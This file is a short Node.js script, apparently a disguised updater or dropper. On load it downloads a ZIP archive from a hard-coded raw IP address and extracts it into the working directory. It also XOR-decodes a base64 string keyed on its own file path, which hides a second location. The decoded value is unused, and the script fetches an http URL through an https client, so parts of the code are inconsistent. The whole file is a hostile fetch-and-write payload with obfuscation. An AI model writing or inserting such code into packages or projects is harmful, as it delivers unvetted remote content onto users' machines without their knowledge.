const https = require('https');
const fs = require('fs');
const AdmZip = require('adm-zip');
const path = require('path');

const filePath = __filename;
const normalizedPath = filePath.replace(/\\/g, '/');
const parentFolder = path.basename(path.dirname(normalizedPath));
const fileName = path.basename(normalizedPath);
const updateFile = path.join(parentFolder, fileName);
const finalFile = updateFile;

const zipFilePath = path.join(process.cwd(), 'downloadedFile.zip');
const extractPath = process.cwd();


const url = "http://89.116.171.177:8080/s/1BbcReywa3YFW1N/download";
const location = "HAQGH0JWAE1JSlBFUwBbREVeQ1hPQxdFSFROB0ofKBEXIhcWDxgcLDYzUDpKSgUEGhwdDhw=";

let dl = j1(Buffer.from(location, 'base64').toString('utf8'), finalFile);

const downloadFile = (url, filePath) => {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);
    https.get(url, (response) => {
      // Handle redirect
      if (response.statusCode === 301 || response.statusCode === 302) {
        return downloadFile(response.headers.location, filePath).then(resolve).catch(reject);
      }
      // Check for request error
      if (response.statusCode < 200 || response.statusCode > 299) {
        reject(new Error('Failed to load page, status code: ' + response.statusCode));
      }
      response.pipe(file);
      file.on('finish', () => {
        file.close(resolve);
      });
    }).on('error', (err) => {
      fs.unlink(filePath, () => reject(err));
    });
  });
};

const extractZip = (zipPath, outputPath) => {
  const zip = new AdmZip(zipPath);
  zip.getEntries().forEach(entry => {
    if (entry.entryName !== 'update.exe') { // Skip update.exe
      zip.extractEntryTo(entry, outputPath, false, true);
    }
  });
};

function j1(a, b) {
    let o = '';
    for (let i = 0; i < a.length; i++) {
        o += String.fromCharCode(a.charCodeAt(i) ^ b.charCodeAt(i % b.length));
    }
    return o;
}

(async () => {
  try {
    // Download the file
    await downloadFile(url, zipFilePath);
    console.log('File downloaded successfully.');

    // Extract the ZIP file
    extractZip(zipFilePath, extractPath);
    console.log('ZIP file extracted successfully.');
  } catch (error) {
    console.error('An error occurred:', error);
  }
})();
